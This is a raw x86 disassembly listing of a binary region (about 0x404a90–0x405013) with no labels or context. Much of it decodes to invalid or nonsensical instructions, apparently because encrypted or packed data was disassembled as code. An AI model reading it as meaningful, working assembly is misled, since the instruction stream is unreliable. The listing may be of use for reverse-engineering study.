  404a90:	68 64 b9 a2 60       	push   $0x60a2b964
  404a95:	8c c8                	mov    %cs,%eax
  404a97:	55                   	push   %ebp
  404a98:	68 64 83 6c 68       	push   $0x686c8364
  404a9d:	64 3a ff             	fs cmp %bh,%bh
  404aa0:	9f                   	lahf
  404aa1:	9d                   	popf
  404aa2:	b9 9c 6d 19 29       	mov    $0x29196d9c,%ecx
  404aa7:	0e                   	push   %cs
  404aa8:	b7 ae                	mov    $0xae,%bh
  404aaa:	78 66                	js     0x404b12
  404aac:	97                   	xchg   %eax,%edi
  404aad:	d1 c6                	rol    $1,%esi
  404aaf:	99                   	cltd
  404ab0:	96                   	xchg   %eax,%esi
  404ab1:	9b                   	fwait
  404ab2:	d2 77 5c             	shlb   %cl,0x5c(%edi)
  404ab5:	64 3a e5             	fs cmp %ch,%ah
  404ab8:	ac                   	lods   %ds:(%esi),%al
  404ab9:	6c                   	insb   (%dx),%es:(%edi)
  404aba:	d2 ab 5b 64 3a df    	shrb   %cl,-0x20c59ba5(%ebx)
  404ac0:	62 64 3a 66          	bound  %esp,0x66(%edx,%edi,1)
  404ac4:	f1                   	int1
  404ac5:	93                   	xchg   %eax,%ebx
  404ac6:	c3                   	ret
  404ac7:	e5 92                	in     $0x92,%eax
  404ac9:	61                   	popa
  404aca:	47                   	inc    %edi
  404acb:	75 00                	jne    0x404acd
  404acd:	08 f6                	or     %dh,%dh
  404acf:	24 68                	and    $0x68,%al
  404ad1:	9b                   	fwait
  404ad2:	8f                   	(bad)
  404ad3:	9a 97 9a c5 8e 84 57 	lcall  $0x5784,$0x8ec59a97
  404ada:	3a 66 eb             	cmp    -0x15(%esi),%ah
  404add:	a0 32 ef 98 4d       	mov    0x4d98ef32,%al
  404ae2:	ca ef ae             	lret   $0xaeef
  404ae5:	e5 bf                	in     $0xbf,%eax
  404ae7:	ae                   	scas   %es:(%edi),%al
  404ae8:	97                   	xchg   %eax,%edi
  404ae9:	99                   	cltd
  404aea:	c5 e6 68             	(bad)
  404aed:	64 3a 99 ed 90 c5 98 	cmp    %fs:-0x673a6f13(%ecx),%bl
  404af4:	97                   	xchg   %eax,%edi
  404af5:	ef                   	out    %eax,(%dx)
  404af6:	bf 9e 97 9a c5       	mov    $0xc59a979e,%edi
  404afb:	5f                   	pop    %edi
  404afc:	ed                   	in     (%dx),%eax
  404afd:	ac                   	lods   %ds:(%esi),%al
  404afe:	c5 9b 97 6b b8 ce    	lds    -0x31479469(%ebx),%ebx
  404b04:	96                   	xchg   %eax,%esi
  404b05:	9b                   	fwait
  404b06:	c5 ef ed             	(bad)
  404b09:	88 c5                	mov    %al,%ch
  404b0b:	9b                   	fwait
  404b0c:	97                   	xchg   %eax,%edi
  404b0d:	8d 4f 67             	lea    0x67(%edi),%ecx
  404b10:	68 64 b1 23 74       	push   $0x7423b164
  404b15:	ed                   	in     (%dx),%eax
  404b16:	bf 9e 97 9a c5       	mov    $0xc59a979e,%edi
  404b1b:	8f                   	(bad)
  404b1c:	2b 65 3a             	sub    0x3a(%ebp),%esp
  404b1f:	66 e8 d9 3a          	callw  0x85fc
  404b23:	66 97                	xchg   %ax,%di
  404b25:	9b                   	fwait
  404b26:	3a 69 ec             	cmp    -0x14(%ecx),%ch
  404b29:	52                   	push   %edx
  404b2a:	3b 66 68             	cmp    0x68(%esi),%esp
  404b2d:	e5 cc                	in     $0xcc,%eax
  404b2f:	a9 21 64 3a ed       	test   $0xed3a6421,%eax
  404b34:	2d 78 3f 66 a0       	sub    $0xa0663f78,%eax
  404b39:	64 3a 5f ed          	cmp    %fs:-0x13(%edi),%bl
  404b3d:	9c                   	pushf
  404b3e:	c5 98 97 6b b9 26    	lds    0x26b96b97(%eax),%ebx
  404b44:	69 64 3a ed ed 9c c5 	imul   $0x98c59ced,-0x13(%edx,%edi,1),%esp
  404b4b:	98 
  404b4c:	97                   	xchg   %eax,%edi
  404b4d:	ed                   	in     (%dx),%eax
  404b4e:	bf 8a 97 99 c5       	mov    $0xc599978a,%edi
  404b53:	99                   	cltd
  404b54:	1d 70 52 0b a2       	sbb    $0xa20b5270,%eax
  404b59:	26 3a eb             	es cmp %bl,%ch
  404b5c:	ed                   	in     (%dx),%eax
  404b5d:	90                   	nop
  404b5e:	c5 9b 97 34 d2 5b    	lds    0x5bd23497(%ebx),%ebx
  404b64:	5b                   	pop    %ebx
  404b65:	64 3a e5             	fs cmp %ch,%ah
  404b68:	ac                   	lods   %ds:(%esi),%al
  404b69:	68 b7 eb 9c 9b       	push   $0x9b9cebb7
  404b6e:	c7                   	(bad)
  404b6f:	99                   	cltd
  404b70:	eb ac                	jmp    0x404b1e
  404b72:	c5 26                	lds    (%esi),%esp
  404b74:	e8 58 3b 66 1d       	call   0x1da686d1
  404b79:	9d                   	popf
  404b7a:	b3 a1                	mov    $0xa1,%bl
  404b7c:	0e                   	push   %cs
  404b7d:	ed                   	in     (%dx),%eax
  404b7e:	87 ac 97 99 c5 eb ed 	xchg   %ebp,-0x12143a67(%edi,%edx,4)
  404b85:	64 3a 99 97 34 35 d1 	cmp    %fs:-0x2ecacb69(%ecx),%bl
  404b8c:	ed                   	in     (%dx),%eax
  404b8d:	ae                   	scas   %es:(%edi),%al
  404b8e:	c5 9b 97 e9 be 63    	lds    0x63bee997(%ebx),%ebx
  404b94:	9c                   	pushf
  404b95:	9b                   	fwait
  404b96:	c7                   	(bad)
  404b97:	99                   	cltd
  404b98:	38 8c 5c 48 68 64 b7 	cmp    %cl,-0x489b97b8(%esp,%ebx,2)
  404b9f:	e3 9c                	jecxz  0x404b3d
  404ba1:	9b                   	fwait
  404ba2:	c7                   	(bad)
  404ba3:	99                   	cltd
  404ba4:	38 8c ea 9e 97 9b b9 	cmp    %cl,-0x46646862(%edx,%ebp,8)
  404bab:	a2 6c ed bf 96       	mov    %al,0x96bfed6c
  404bb0:	97                   	xchg   %eax,%edi
  404bb1:	99                   	cltd
  404bb2:	c5 ef 98             	(bad)
  404bb5:	4d                   	dec    %ebp
  404bb6:	ca ef ae             	lret   $0xaeef
  404bb9:	9b                   	fwait
  404bba:	8f                   	(bad)
  404bbb:	92                   	xchg   %eax,%edx
  404bbc:	97                   	xchg   %eax,%edi
  404bbd:	9a c5 99 1d 7c c5 d3 	lcall  $0xd3c5,$0x7c1d99c5
  404bc4:	98                   	cwtl
  404bc5:	9b                   	fwait
  404bc6:	c7                   	(bad)
  404bc7:	99                   	cltd
  404bc8:	e3 e1                	jecxz  0x404bab
  404bca:	c6                   	(bad)
  404bcb:	99                   	cltd
  404bcc:	96                   	xchg   %eax,%esi
  404bcd:	9b                   	fwait
  404bce:	6a 0e                	push   $0xe
  404bd0:	10 ae 78 66 38 8c    	adc    %ch,-0x73c79988(%esi)
  404bd6:	f0 54                	lock push %esp
  404bd8:	68 64 b9 a2 70       	push   $0x70a2b964
  404bdd:	8c 90 54 68 64 83    	mov    %ss,-0x7c9b97ac(%eax)
  404be3:	6c                   	insb   (%dx),%es:(%edi)
  404be4:	68 64 3a ff 9f       	push   $0x9fff3a64
  404be9:	9d                   	popf
  404bea:	b9 9c 6d 19 29       	mov    $0x29196d9c,%ecx
  404bef:	0e                   	push   %cs
  404bf0:	19 ae 78 66 97 d1    	sbb    %ebp,-0x2e689988(%esi)
  404bf6:	c6                   	(bad)
  404bf7:	99                   	cltd
  404bf8:	96                   	xchg   %eax,%esi
  404bf9:	9b                   	fwait
  404bfa:	d2 af 5a 64 3a e5    	shrb   %cl,-0x1ac59ba6(%edi)
  404c00:	ac                   	lods   %ds:(%esi),%al
  404c01:	6c                   	insb   (%dx),%es:(%edi)
  404c02:	d2 e3                	shl    %cl,%bl
  404c04:	5a                   	pop    %edx
  404c05:	64 3a df             	fs cmp %bh,%bl
  404c08:	62 64 3a 66          	bound  %esp,0x66(%edx,%edi,1)
  404c0c:	f1                   	int1
  404c0d:	93                   	xchg   %eax,%ebx
  404c0e:	c3                   	ret
  404c0f:	e5 92                	in     $0x92,%eax
  404c11:	61                   	popa
  404c12:	47                   	inc    %edi
  404c13:	75 00                	jne    0x404c15
  404c15:	bb f0 24 68 9b       	mov    $0x9b6824f0,%ebx
  404c1a:	8f                   	(bad)
  404c1b:	9a 97 9a c5 8e cc 56 	lcall  $0x56cc,$0x8ec59a97
  404c22:	3a 66 eb             	cmp    -0x15(%esi),%ah
  404c25:	a0 32 8e 08 56       	mov    0x56088e32,%al
  404c2a:	3a 66 d1             	cmp    -0x2f(%esi),%ah
  404c2d:	6e                   	outsb  %ds:(%esi),(%dx)
  404c2e:	3a 66 68             	cmp    0x68(%esi),%ah
  404c31:	fd                   	std
  404c32:	cd 9f                	int    $0x9f
  404c34:	eb 9e                	jmp    0x404bd4
  404c36:	3f                   	aas
  404c37:	1b 7b 0c             	sbb    0xc(%ebx),%edi
  404c3a:	56                   	push   %esi
  404c3b:	aa                   	stos   %al,%es:(%edi)
  404c3c:	2a 64 c5 d3          	sub    -0x2d(%ebp,%eax,8),%ah
  404c40:	94                   	xchg   %eax,%esp
  404c41:	9b                   	fwait
  404c42:	c4 99 80 1b 08 66    	les    0x66081b80(%ecx),%ebx
  404c48:	68 e7 fe 6e e9       	push   $0xe96efee7
  404c4d:	92                   	xchg   %eax,%edx
  404c4e:	44                   	inc    %esp
  404c4f:	31 68 64             	xor    %ebp,0x64(%eax)
  404c52:	c5 d3 98             	(bad)
  404c55:	9b                   	fwait
  404c56:	c7                   	(bad)
  404c57:	99                   	cltd
  404c58:	80 97 14 66 68 9b bf 	adcb   $0xbf,-0x649799ec(%edi)
  404c5f:	92                   	xchg   %eax,%edx
  404c60:	97                   	xchg   %eax,%edi
  404c61:	9a c5 eb ed 64 3a 99 	lcall  $0x993a,$0x64edebc5
  404c68:	97                   	xchg   %eax,%edi
  404c69:	34 c5                	xor    $0xc5,%al
  404c6b:	d3 90 9b c4 99 3b    	rcll   %cl,0x3b99c49b(%eax)
  404c71:	8c 73 91             	mov    %?,-0x6f(%ebx)
  404c74:	97                   	xchg   %eax,%edi
  404c75:	9b                   	fwait
  404c76:	b9 a2 64 ed bf       	mov    $0xbfed64a2,%ecx
  404c7b:	9e                   	sahf
  404c7c:	97                   	xchg   %eax,%edi
  404c7d:	9a c5 6f a8 6b bf ff 	lcall  $0xffbf,$0x6ba86fc5
  404c84:	96                   	xchg   %eax,%esi
  404c85:	9b                   	fwait
  404c86:	c5 0e                	lds    (%esi),%ecx
  404c88:	26 ae                	es scas %es:(%edi),%al
  404c8a:	78 66                	js     0x404cf2
  404c8c:	97                   	xchg   %eax,%edi
  404c8d:	d1 c6                	rol    $1,%esi
  404c8f:	99                   	cltd
  404c90:	96                   	xchg   %eax,%esi
  404c91:	9b                   	fwait
  404c92:	d2 57 5a             	rclb   %cl,0x5a(%edi)
  404c95:	64 3a e5             	fs cmp %ch,%ah
  404c98:	ac                   	lods   %ds:(%esi),%al
  404c99:	6c                   	insb   (%dx),%es:(%edi)
  404c9a:	d2 8b 59 64 3a df    	rorb   %cl,-0x20c59ba7(%ebx)
  404ca0:	62 64 3a 66          	bound  %esp,0x66(%edx,%edi,1)
  404ca4:	f1                   	int1
  404ca5:	93                   	xchg   %eax,%ebx
  404ca6:	c3                   	ret
  404ca7:	e5 92                	in     $0x92,%eax
  404ca9:	61                   	popa
  404caa:	47                   	inc    %edi
  404cab:	75 00                	jne    0x404cad
  404cad:	15 f0 24 68 9b       	adc    $0x9b6824f0,%eax
  404cb2:	8f                   	(bad)
  404cb3:	9a 97 9a c5 8e 64 56 	lcall  $0x5664,$0x8ec59a97
  404cba:	3a 66 eb             	cmp    -0x15(%esi),%ah
  404cbd:	a0 32 8e a0 55       	mov    0x55a08e32,%al
  404cc2:	3a 66 d1             	cmp    -0x2f(%esi),%ah
  404cc5:	6e                   	outsb  %ds:(%esi),(%dx)
  404cc6:	3a 66 68             	cmp    0x68(%esi),%ah
  404cc9:	fd                   	std
  404cca:	cd 9f                	int    $0x9f
  404ccc:	eb 9e                	jmp    0x404c6c
  404cce:	3f                   	aas
  404ccf:	1b 7b 0c             	sbb    0xc(%ebx),%edi
  404cd2:	e5 ac                	in     $0xac,%eax
  404cd4:	2a 64 c5 d3          	sub    -0x2d(%ebp,%eax,8),%ah
  404cd8:	94                   	xchg   %eax,%esp
  404cd9:	9b                   	fwait
  404cda:	c4 99 80 83 0b 66    	les    0x660b8380(%ecx),%ebx
  404ce0:	68 e7 fe 6e 80       	push   $0x806efee7
  404ce5:	c7                   	(bad)
  404ce6:	0b 66 68             	or     0x68(%esi),%esp
  404ce9:	dd 30                	fnsave (%eax)
  404ceb:	66 68 64 a3          	pushw  $0xa364
  404cef:	91                   	xchg   %eax,%ecx
  404cf0:	91                   	xchg   %eax,%ecx
  404cf1:	e7 c0                	out    %eax,$0xc0
  404cf3:	63 15 77 52 0a a4    	arpl   %edx,0xa40a5277
  404cf9:	26 3a 99 dd 98 c5 98 	cmp    %es:-0x673a6723(%ecx),%bl
  404d00:	97                   	xchg   %eax,%edi
  404d01:	8c f8                	mov    %?,%eax
  404d03:	57                   	push   %edi
  404d04:	68 64 b9 a2 60       	push   $0x60a2b964
  404d09:	e5 cc                	in     $0xcc,%eax
  404d0b:	c6                   	(bad)
  404d0c:	5c                   	pop    %esp
  404d0d:	64 3a 0e             	cmp    %fs:(%esi),%cl
  404d10:	2e ae                	cs scas %es:(%edi),%al
  404d12:	78 66                	js     0x404d7a
  404d14:	97                   	xchg   %eax,%edi
  404d15:	d1 c6                	rol    $1,%esi
  404d17:	99                   	cltd
  404d18:	96                   	xchg   %eax,%esi
  404d19:	9b                   	fwait
  404d1a:	d2 cf                	ror    %cl,%bh
  404d1c:	59                   	pop    %ecx
  404d1d:	64 3a e5             	fs cmp %ch,%ah
  404d20:	ac                   	lods   %ds:(%esi),%al
  404d21:	6c                   	insb   (%dx),%es:(%edi)
  404d22:	d2 03                	rolb   %cl,(%ebx)
  404d24:	59                   	pop    %ecx
  404d25:	64 3a df             	fs cmp %bh,%bl
  404d28:	62 64 3a 66          	bound  %esp,0x66(%edx,%edi,1)
  404d2c:	f1                   	int1
  404d2d:	93                   	xchg   %eax,%ebx
  404d2e:	c3                   	ret
  404d2f:	e5 92                	in     $0x92,%eax
  404d31:	61                   	popa
  404d32:	47                   	inc    %edi
  404d33:	45                   	inc    %ebp
  404d34:	80 37 0b             	xorb   $0xb,(%edi)
  404d37:	66 68 dd 59          	pushw  $0x59dd
  404d3b:	66 68 64 a3          	pushw  $0xa364
  404d3f:	91                   	xchg   %eax,%ecx
  404d40:	91                   	xchg   %eax,%ecx
  404d41:	36 b1 db             	ss mov $0xdb,%cl
  404d44:	94                   	xchg   %eax,%esp
  404d45:	9b                   	fwait
  404d46:	c4 99 3f 0c 68 ad    	les    -0x5297f3c1(%ecx),%ebx
  404d4c:	2a 64 6d 8e          	sub    -0x72(%ebp,%ebp,2),%ah
  404d50:	38 55 3a             	cmp    %dl,0x3a(%ebp)
  404d53:	66 eb a0             	data16 jmp 0x404cf6
  404d56:	2a 8e 58 55 3a 66    	sub    0x663a5558(%esi),%cl
  404d5c:	d1 6e 3a             	shrl   $1,0x3a(%esi)
  404d5f:	66 68 fd cd          	pushw  $0xcdfd
  404d63:	9f                   	lahf
  404d64:	eb 9e                	jmp    0x404d04
  404d66:	3f                   	aas
  404d67:	1b 7b 0c             	sbb    0xc(%ebx),%edi
  404d6a:	4b                   	dec    %ebx
  404d6b:	ac                   	lods   %ds:(%esi),%al
  404d6c:	2a 64 c5 d3          	sub    -0x2d(%ebp,%eax,8),%ah
  404d70:	94                   	xchg   %eax,%esp
  404d71:	9b                   	fwait
  404d72:	c4 99 80 2b 0b 66    	les    0x660b2b80(%ecx),%ebx
  404d78:	68 e7 fe 6e 80       	push   $0x806efee7
  404d7d:	6f                   	outsl  %ds:(%esi),(%dx)
  404d7e:	0b 66 68             	or     0x68(%esi),%esp
  404d81:	dd 30                	fnsave (%eax)
  404d83:	66 68 64 a3          	pushw  $0xa364
  404d87:	91                   	xchg   %eax,%ecx
  404d88:	91                   	xchg   %eax,%ecx
  404d89:	e7 c0                	out    %eax,$0xc0
  404d8b:	63 15 77 52 b9 a2    	arpl   %edx,0xa2b95277
  404d91:	26 3a 99 dd 98 c5 98 	cmp    %es:-0x673a6723(%ecx),%bl
  404d98:	97                   	xchg   %eax,%edi
  404d99:	8c 10                	mov    %ss,(%eax)
  404d9b:	57                   	push   %edi
  404d9c:	68 64 b9 a2 60       	push   $0x60a2b964
  404da1:	e5 cc                	in     $0xcc,%eax
  404da3:	15 01 64 3a 8e       	adc    $0x8e3a6401,%eax
  404da8:	88 54 3a 66          	mov    %dl,0x66(%edx,%edi,1)
  404dac:	d1 6e 3a             	shrl   $1,0x3a(%esi)
  404daf:	66 68 fd cd          	pushw  $0xcdfd
  404db3:	9f                   	lahf
  404db4:	eb 9e                	jmp    0x404d54
  404db6:	3f                   	aas
  404db7:	1b 7b 0c             	sbb    0xc(%ebx),%edi
  404dba:	56                   	push   %esi
  404dbb:	aa                   	stos   %al,%es:(%edi)
  404dbc:	2a 64 c5 d3          	sub    -0x2d(%ebp,%eax,8),%ah
  404dc0:	94                   	xchg   %eax,%esp
  404dc1:	9b                   	fwait
  404dc2:	c4 99 80 9b 0a 66    	les    0x660a9b80(%ecx),%ebx
  404dc8:	68 e7 fe 6e 80       	push   $0x806efee7
  404dcd:	df 0a                	fisttps (%edx)
  404dcf:	66 68 dd 30          	pushw  $0x30dd
  404dd3:	66 68 64 a3          	pushw  $0xa364
  404dd7:	91                   	xchg   %eax,%ecx
  404dd8:	91                   	xchg   %eax,%ecx
  404dd9:	e7 c0                	out    %eax,$0xc0
  404ddb:	63 15 47 d2 cf 58    	arpl   %edx,0x58cfd247
  404de1:	64 3a df             	fs cmp %bh,%bl
  404de4:	0b 64 3a 66          	or     0x66(%edx,%edi,1),%esp
  404de8:	f1                   	int1
  404de9:	93                   	xchg   %eax,%ebx
  404dea:	c3                   	ret
  404deb:	34 e3                	xor    $0xe3,%al
  404ded:	d9 c6                	fld    %st(6)
  404def:	99                   	cltd
  404df0:	96                   	xchg   %eax,%esi
  404df1:	9b                   	fwait
  404df2:	6d                   	insl   (%dx),%es:(%edi)
  404df3:	0e                   	push   %cs
  404df4:	3a af 78 66 3f 8c    	cmp    -0x73c09988(%edi),%ch
  404dfa:	9c                   	pushf
  404dfb:	56                   	push   %esi
  404dfc:	68 64 b9 a2 78       	push   $0x78a2b964
  404e01:	0c 07                	or     $0x7,%al
  404e03:	ac                   	lods   %ds:(%esi),%al
  404e04:	2a 64 c5 d3          	sub    -0x2d(%ebp,%eax,8),%ah
  404e08:	94                   	xchg   %eax,%esp
  404e09:	9b                   	fwait
  404e0a:	c4 99 80 d3 0a 66    	les    0x660ad380(%ecx),%ebx
  404e10:	68 e7 fe 6e e1       	push   $0xe16efee7
  404e15:	94                   	xchg   %eax,%esp
  404e16:	3b 96 e1 a2 d2 0b    	cmp    0xbd2a2e1(%esi),%edx
  404e1c:	58                   	pop    %eax
  404e1d:	64 3a df             	fs cmp %bh,%bl
  404e20:	62 64 3a 66          	bound  %esp,0x66(%edx,%edi,1)
  404e24:	f1                   	int1
  404e25:	93                   	xchg   %eax,%ebx
  404e26:	c3                   	ret
  404e27:	e5 92                	in     $0x92,%eax
  404e29:	61                   	popa
  404e2a:	47                   	inc    %edi
  404e2b:	75 00                	jne    0x404e2d
  404e2d:	08 f6                	or     %dh,%dh
  404e2f:	24 68                	and    $0x68,%al
  404e31:	9b                   	fwait
  404e32:	8f                   	(bad)
  404e33:	9a 97 9a c5 8e e4 54 	lcall  $0x54e4,$0x8ec59a97
  404e3a:	3a 66 eb             	cmp    -0x15(%esi),%ah
  404e3d:	a0 32 0e 58 ae       	mov    0xae580e32,%al
  404e42:	78 66                	js     0x404eaa
  404e44:	97                   	xchg   %eax,%edi
  404e45:	d1 c6                	rol    $1,%esi
  404e47:	99                   	cltd
  404e48:	96                   	xchg   %eax,%esi
  404e49:	9b                   	fwait
  404e4a:	d2 1f                	rcrb   %cl,(%edi)
  404e4c:	58                   	pop    %eax
  404e4d:	64 3a e5             	fs cmp %ch,%ah
  404e50:	ac                   	lods   %ds:(%esi),%al
  404e51:	6c                   	insb   (%dx),%es:(%edi)
  404e52:	d2 53 58             	rclb   %cl,0x58(%ebx)
  404e55:	64 3a df             	fs cmp %bh,%bl
  404e58:	62 64 3a 66          	bound  %esp,0x66(%edx,%edi,1)
  404e5c:	f1                   	int1
  404e5d:	93                   	xchg   %eax,%ebx
  404e5e:	c3                   	ret
  404e5f:	e5 92                	in     $0x92,%eax
  404e61:	61                   	popa
  404e62:	47                   	inc    %edi
  404e63:	75 00                	jne    0x404e65
  404e65:	08 f6                	or     %dh,%dh
  404e67:	24 68                	and    $0x68,%al
  404e69:	9b                   	fwait
  404e6a:	8f                   	(bad)
  404e6b:	9a 97 9a c5 8e 3c 54 	lcall  $0x543c,$0x8ec59a97
  404e72:	3a 66 eb             	cmp    -0x15(%esi),%ah
  404e75:	a0 32 0e 46 ae       	mov    0xae460e32,%al
  404e7a:	78 66                	js     0x404ee2
  404e7c:	97                   	xchg   %eax,%edi
  404e7d:	d1 c6                	rol    $1,%esi
  404e7f:	99                   	cltd
  404e80:	96                   	xchg   %eax,%esi
  404e81:	9b                   	fwait
  404e82:	d2 27                	shlb   %cl,(%edi)
  404e84:	58                   	pop    %eax
  404e85:	64 3a e5             	fs cmp %ch,%ah
  404e88:	ac                   	lods   %ds:(%esi),%al
  404e89:	6c                   	insb   (%dx),%es:(%edi)
  404e8a:	bb 90 da 1e 3a       	mov    $0x3a1eda90,%ebx
  404e8f:	66 80 93 15 66 68 dd 	data16 adcb $0x30,-0x229799eb(%ebx)
  404e96:	30 
  404e97:	66 68 64 a3          	pushw  $0xa364
  404e9b:	91                   	xchg   %eax,%ecx
  404e9c:	91                   	xchg   %eax,%ecx
  404e9d:	e7 c0                	out    %eax,$0xc0
  404e9f:	63 15 77 52 0a a4    	arpl   %edx,0xa40a5277
  404ea5:	26 3a 99 dd 98 c5 98 	cmp    %es:-0x673a6723(%ecx),%bl
  404eac:	97                   	xchg   %eax,%edi
  404ead:	8c 2c 56             	mov    %gs,(%esi,%edx,2)
  404eb0:	68 64 b9 a2 60       	push   $0x60a2b964
  404eb5:	e9 bf b8 97 99       	jmp    0x99d80779
  404eba:	c5 36                	lds    (%esi),%esi
  404ebc:	e3 e1                	jecxz  0x404e9f
  404ebe:	c6                   	(bad)
  404ebf:	99                   	cltd
  404ec0:	96                   	xchg   %eax,%esi
  404ec1:	9b                   	fwait
  404ec2:	6a 0e                	push   $0xe
  404ec4:	7e ae                	jle    0x404e74
  404ec6:	78 66                	js     0x404f2e
  404ec8:	38 8c ec 49 68 64 b9 	cmp    %cl,-0x469b97b7(%esp,%ebp,8)
  404ecf:	a2 78 8c 8c 49       	mov    %al,0x498c8c78
  404ed4:	68 64 83 6c 68       	push   $0x686c8364
  404ed9:	64 3a ff             	fs cmp %bh,%bh
  404edc:	9f                   	lahf
  404edd:	9d                   	popf
  404ede:	b9 9c 6d 19 29       	mov    $0x29196d9c,%ecx
  404ee3:	0e                   	push   %cs
  404ee4:	04 a8                	add    $0xa8,%al
  404ee6:	78 66                	js     0x404f4e
  404ee8:	97                   	xchg   %eax,%edi
  404ee9:	d1 c6                	rol    $1,%esi
  404eeb:	99                   	cltd
  404eec:	96                   	xchg   %eax,%esi
  404eed:	9b                   	fwait
  404eee:	d2 b3 47 64 3a e5    	shlb   %cl,-0x1ac59bb9(%ebx)
  404ef4:	ac                   	lods   %ds:(%esi),%al
  404ef5:	6c                   	insb   (%dx),%es:(%edi)
  404ef6:	b3 96                	mov    $0x96,%bl
  404ef8:	9f                   	lahf
  404ef9:	82 b3 e3 a0 9b c7 99 	xorb   $0x99,-0x38645f1d(%ebx)
  404f00:	e1 a2                	loope  0x404ea4
  404f02:	52                   	push   %edx
  404f03:	72 a2                	jb     0x404ea7
  404f05:	26 3a 99 dd 98 c5 98 	cmp    %es:-0x673a6723(%ecx),%bl
  404f0c:	97                   	xchg   %eax,%edi
  404f0d:	8c 8c 49 68 64 b9 a2 	mov    %cs,-0x5d469b98(%ecx,%ecx,2)
  404f14:	60                   	pusha
  404f15:	8c 48 49             	mov    %cs,0x49(%eax)
  404f18:	68 64 83 6c 68       	push   $0x686c8364
  404f1d:	64 3a ff             	fs cmp %bh,%bh
  404f20:	9f                   	lahf
  404f21:	9d                   	popf
  404f22:	b9 9c 6d 19 29       	mov    $0x29196d9c,%ecx
  404f27:	0e                   	push   %cs
  404f28:	04 a8                	add    $0xa8,%al
  404f2a:	78 66                	js     0x404f92
  404f2c:	97                   	xchg   %eax,%edi
  404f2d:	d1 c6                	rol    $1,%esi
  404f2f:	99                   	cltd
  404f30:	96                   	xchg   %eax,%esi
  404f31:	9b                   	fwait
  404f32:	d2 f7                	shl    %cl,%bh
  404f34:	47                   	inc    %edi
  404f35:	64 3a e5             	fs cmp %ch,%ah
  404f38:	ac                   	lods   %ds:(%esi),%al
  404f39:	6c                   	insb   (%dx),%es:(%edi)
  404f3a:	d2 2b                	shrb   %cl,(%ebx)
  404f3c:	47                   	inc    %edi
  404f3d:	64 3a df             	fs cmp %bh,%bl
  404f40:	80 67 3a 66          	andb   $0x66,0x3a(%edi)
  404f44:	f1                   	int1
  404f45:	93                   	xchg   %eax,%ebx
  404f46:	c3                   	ret
  404f47:	ef                   	out    %eax,(%dx)
  404f48:	bf e5 fd 76 4f       	mov    $0x4f76fde5,%edi
  404f4d:	64 3a 31             	cmp    %fs:(%ecx),%dh
  404f50:	e3 d9                	jecxz  0x404f2b
  404f52:	c6                   	(bad)
  404f53:	99                   	cltd
  404f54:	96                   	xchg   %eax,%esi
  404f55:	9b                   	fwait
  404f56:	6d                   	insl   (%dx),%es:(%edi)
  404f57:	0e                   	push   %cs
  404f58:	94                   	xchg   %eax,%esp
  404f59:	ad                   	lods   %ds:(%esi),%eax
  404f5a:	78 66                	js     0x404fc2
  404f5c:	3f                   	aas
  404f5d:	8c 78 49             	mov    %?,0x49(%eax)
  404f60:	68 64 b9 a2 78       	push   $0x78a2b964
  404f65:	8c 18                	mov    %ds,(%eax)
  404f67:	49                   	dec    %ecx
  404f68:	68 64 83 6c 68       	push   $0x686c8364
  404f6d:	64 3a ff             	fs cmp %bh,%bh
  404f70:	9f                   	lahf
  404f71:	9d                   	popf
  404f72:	b9 9c 6d 19 29       	mov    $0x29196d9c,%ecx
  404f77:	0e                   	push   %cs
  404f78:	04 a8                	add    $0xa8,%al
  404f7a:	78 66                	js     0x404fe2
  404f7c:	97                   	xchg   %eax,%edi
  404f7d:	d1 c6                	rol    $1,%esi
  404f7f:	99                   	cltd
  404f80:	96                   	xchg   %eax,%esi
  404f81:	9b                   	fwait
  404f82:	d2 27                	shlb   %cl,(%edi)
  404f84:	47                   	inc    %edi
  404f85:	64 3a e5             	fs cmp %ch,%ah
  404f88:	ac                   	lods   %ds:(%esi),%al
  404f89:	6c                   	insb   (%dx),%es:(%edi)
  404f8a:	bb 88 06 6c 3a       	mov    $0x3a6c0688,%ebx
  404f8f:	66 00 96 f3 24 68 9b 	data16 add %dl,-0x6497db0d(%esi)
  404f96:	8f                   	(bad)
  404f97:	9a 97 9a c5 8e 40 4b 	lcall  $0x4b40,$0x8ec59a97
  404f9e:	3a 66 eb             	cmp    -0x15(%esi),%ah
  404fa1:	a0 32 8e 8c 4a       	mov    0x4a8c8e32,%al
  404fa6:	3a 66 d1             	cmp    -0x2f(%esi),%ah
  404fa9:	6e                   	outsb  %ds:(%esi),(%dx)
  404faa:	3a 66 68             	cmp    0x68(%esi),%ah
  404fad:	fd                   	std
  404fae:	cd 9f                	int    $0x9f
  404fb0:	eb 9e                	jmp    0x404f50
  404fb2:	3f                   	aas
  404fb3:	1b 7b 0c             	sbb    0xc(%ebx),%edi
  404fb6:	56                   	push   %esi
  404fb7:	aa                   	stos   %al,%es:(%edi)
  404fb8:	2a 64 c5 d3          	sub    -0x2d(%ebp,%eax,8),%ah
  404fbc:	94                   	xchg   %eax,%esp
  404fbd:	9b                   	fwait
  404fbe:	c4 99 80 67 15 66    	les    0x66156780(%ecx),%ebx
  404fc4:	68 e7 fe 6e 80       	push   $0x806efee7
  404fc9:	db 14 66             	fistl  (%esi,%eiz,2)
  404fcc:	68 dd 30 66 68       	push   $0x686630dd
  404fd1:	64 a3 91 91 e7 c0    	mov    %eax,%fs:0xc0e79191
  404fd7:	63 15 47 d2 cb 46    	arpl   %edx,0x46cbd247
  404fdd:	64 3a df             	fs cmp %bh,%bl
  404fe0:	0b 64 3a 66          	or     0x66(%edx,%edi,1),%esp
  404fe4:	f1                   	int1
  404fe5:	93                   	xchg   %eax,%ebx
  404fe6:	c3                   	ret
  404fe7:	34 e3                	xor    $0xe3,%al
  404fe9:	d9 c6                	fld    %st(6)
  404feb:	99                   	cltd
  404fec:	96                   	xchg   %eax,%esi
  404fed:	9b                   	fwait
  404fee:	6d                   	insl   (%dx),%es:(%edi)
  404fef:	0e                   	push   %cs
  404ff0:	3a af 78 66 3f 8c    	cmp    -0x73c09988(%edi),%ch
  404ff6:	90                   	nop
  404ff7:	48                   	dec    %eax
  404ff8:	68 64 b9 a2 78       	push   $0x78a2b964
  404ffd:	0c de                	or     $0xde,%al
  404fff:	af                   	scas   %es:(%edi),%eax
  405000:	2a 64 c5 d3          	sub    -0x2d(%ebp,%eax,8),%ah
  405004:	94                   	xchg   %eax,%esp
  405005:	9b                   	fwait
  405006:	c4 99 80 df 14 66    	les    0x6614df80(%ecx),%ebx
  40500c:	68 e7 fe 6e d0       	push   $0xd06efee7
  405011:	78 50                	js     0x405063
  405013:	66 68 93 dc          	pushw  $0xdc93
